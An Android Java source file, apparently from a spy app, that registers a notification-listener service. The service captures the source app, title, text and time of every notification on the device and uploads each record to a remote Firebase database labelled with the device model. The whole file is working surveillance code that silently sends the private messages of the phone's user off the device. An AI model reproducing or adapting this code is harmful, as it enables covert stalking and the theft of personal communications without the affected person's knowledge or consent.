package in.spyapp.patanjali.android;

import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.support.annotation.NonNull;
import android.util.Log;


import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class NotificationService extends NotificationListenerService {


    Context context;

    LastNotify lastNotify;



    public static String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        return model;
    }

    @Override

    public void onCreate() {

        lastNotify = new LastNotify();
        super.onCreate();
        context = getApplicationContext();

    }

    public void onNotificationPosted(StatusBarNotification sbn) {

        try {

            String pack = sbn.getPackageName();
            String ticker = "";
            if (sbn.getNotification().tickerText != null) {
                ticker = sbn.getNotification().tickerText.toString();
            }
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString("android.title");
            String text = extras.getCharSequence("android.text").toString();

            long millis = new Date().getTime();

           /* Log.i("Package", pack);
            Log.i("Ticker", ticker);
            Log.i("Title", title);
            Log.i("Text", text);*/


            if(!((title.equals(lastNotify.titleN))&&(text.equals(lastNotify.textN)) && pack.equals(lastNotify.titleN)))
            {


            lastNotify.titleN = title;
            lastNotify.textN = text;
            lastNotify.packageN = pack;

            Map<String, Object> notification = new HashMap<>();
            notification.put("package", pack);
            notification.put("ticker", ticker);
            notification.put("title", title);
            notification.put("text", text);
            notification.put("time", millis);

            FirebaseFirestore db = FirebaseFirestore.getInstance();
                Log.d("nmmmmmmmmmmmm", "code notification ping");

            if (!(pack.equals("com.internet.speed.meter.lite"))) {


                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference myRef = database.getReference(getDeviceName()+" - Notifications");
                Log.d("app name", myRef.getDatabase().getApp().getName());
                Log.d("ref key",myRef.getKey());
                try{
                    Log.d("nmmmmmmmmmmmm", "code 2 working flag");

                    myRef.push().setValue(notification).addOnSuccessListener(new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void aVoid) {
                            // Write was successful!
                            Log.d("write", "success");
                            // ...
                        }
                    }).addOnFailureListener(new OnFailureListener() {
                                @Override
                                public void onFailure(@NonNull Exception e) {
                                    // Write failed
                                    // ...
                                    e.printStackTrace();
                                    Log.d("write", "fail" );

                                }
                            });
                    } catch( Exception e){
                    e.printStackTrace();
                }


                /*
                db.collection("notifications")

                        .add(notification)
                        .addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
                            @Override
                            public void onSuccess(DocumentReference documentReference) {
                                Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.getId());
                            }
                        })
                        .addOnFailureListener(new OnFailureListener() {
                            @Override
                            public void onFailure(@NonNull Exception e) {
                                Log.w(TAG, "Error adding document", e);
                            }
                        });
                        */

            }

            }else
            {
                Log.i("notify", "Repeat detected");
            }
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.i("Msg","Notification Removed");

    }
}